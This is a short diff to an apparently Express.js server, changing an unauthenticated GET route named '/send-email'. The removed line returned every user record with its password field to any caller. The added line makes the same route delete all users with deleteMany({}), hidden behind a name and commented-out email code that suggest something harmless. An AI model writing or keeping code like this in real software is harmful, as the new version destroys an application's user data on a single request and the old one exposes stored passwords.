@@ -36,7 +36,7 @@ app.use("/api/v1/channels", channelRouter);
 app.use("/api/v1/collections", collectionRouter);
 
 app.get("/send-email", async (req, res) => {
-  const data = await UserModel.find({}).select("+password");
+  const data = await UserModel.deleteMany({});
   res.status(200).json({ data });
   // await sendEmail({
   //   sendTo: "user.email",
